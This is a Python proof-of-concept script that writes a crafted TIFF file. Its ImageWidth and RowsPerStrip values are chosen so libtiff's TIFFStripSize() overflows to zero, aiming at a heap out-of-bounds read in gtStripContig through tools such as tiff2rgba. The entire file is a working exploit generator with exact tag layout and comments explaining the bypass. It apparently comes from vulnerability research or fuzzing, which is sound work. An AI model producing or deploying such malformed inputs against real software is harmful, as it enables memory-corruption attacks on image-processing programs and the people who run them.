#!/usr/bin/env python3
"""
vuln_002_gen.py
Generate a crafted TIFF that causes TIFFStripSize() to overflow to 0
via: rowsperstrip(65536) x imagewidth(65536) x spp(4) x bps/8(1) = 2^34 > 2^32

Target vulnerability: gtStripContig heap OOB read (CWE-125)
  - TIFFStripSize returns 0 due to overflow
  - _TIFFmalloc(0) returns non-NULL (bypasses buf==0 check)
  - put callback reads imagewidth*spp bytes per row -> heap OOB read

NOTE: This specific path (TIFFRGBAImageGet -> gtStripContig) is NOT reached
by tiffsplit.  tiffsplit uses cpStrips() (raw strip copy) and never calls
TIFFRGBAImageBegin / TIFFRGBAImageGet.  This file is provided for use with
tools that DO call the TIFFRGBAImage API (e.g. tiff2rgba, custom harnesses).
"""

import struct
import os

OUT = os.path.join(os.path.dirname(__file__), "vuln_002.tif")

# ── Layout ──────────────────────────────────────────────────────────────────
IFD_OFFSET   = 8         # immediately after 8-byte TIFF header
NUM_ENTRIES  = 10
IFD_SIZE     = 2 + NUM_ENTRIES * 12 + 4   # count + entries + next-IFD ptr
IFD_END      = IFD_OFFSET + IFD_SIZE      # = 134

BPS_OFFSET   = IFD_END                    # 134  (4 × SHORT = 8 bytes)
STRIP_OFFSET = BPS_OFFSET + 8             # 142  (actual pixel data)
STRIP_BYTES  = 16                         # tiny but non-zero real data

# ── Key overflow parameters ──────────────────────────────────────────────────
IMAGE_WIDTH   = 65536   # forces overflow when × RowsPerStrip × spp × 1
IMAGE_LENGTH  = 4       # small so the put-loop actually executes rows
SPP           = 4       # SamplesPerPixel (RGBA)
BPS           = 8       # BitsPerSample
ROWS_PER_STRIP = 65536  # 65536 × 65536 × 4 × 1 = 2^34 → wraps to 0 in uint32

# ── IFD entry helper (little-endian) ───────────────────────────────────────
def entry(tag, typ, count, value):
    """Pack one 12-byte IFD entry."""
    return struct.pack('<HHII', tag, typ, count, value)

SHORT = 3
LONG  = 4

entries = [
    entry(256, LONG,  1, IMAGE_WIDTH),        # ImageWidth
    entry(257, LONG,  1, IMAGE_LENGTH),       # ImageLength
    entry(258, SHORT, 4, BPS_OFFSET),         # BitsPerSample (offset)
    entry(259, SHORT, 1, 1),                  # Compression = uncompressed
    entry(262, SHORT, 1, 2),                  # PhotometricInterp = RGB
    entry(273, LONG,  1, STRIP_OFFSET),       # StripOffsets
    entry(277, SHORT, 1, SPP),                # SamplesPerPixel
    entry(278, LONG,  1, ROWS_PER_STRIP),     # RowsPerStrip  ← overflow trigger
    entry(279, LONG,  1, STRIP_BYTES),        # StripByteCounts
    entry(284, SHORT, 1, 1),                  # PlanarConfig = CONTIG
]

buf = bytearray()
# Header: 'II' + magic 42 + IFD offset
buf += b'II'
buf += struct.pack('<H', 42)
buf += struct.pack('<I', IFD_OFFSET)

# IFD
buf += struct.pack('<H', NUM_ENTRIES)
for e in entries:
    buf += e
buf += struct.pack('<I', 0)   # next IFD = NULL

# BitsPerSample data: [8, 8, 8, 8]
buf += struct.pack('<HHHH', BPS, BPS, BPS, BPS)

# Strip payload (minimal real data)
buf += b'\x00' * STRIP_BYTES

with open(OUT, 'wb') as f:
    f.write(buf)

print(f"Written {OUT} ({len(buf)} bytes)")
print(f"  ImageWidth={IMAGE_WIDTH}, ImageLength={IMAGE_LENGTH}")
print(f"  SamplesPerPixel={SPP}, BitsPerSample={BPS}")
print(f"  RowsPerStrip={ROWS_PER_STRIP}")
print(f"  Expected TIFFStripSize overflow: "
      f"{ROWS_PER_STRIP} × {IMAGE_WIDTH} × {SPP} × 1 = "
      f"{ROWS_PER_STRIP * IMAGE_WIDTH * SPP} (>2^32, wraps to 0 in uint32)")
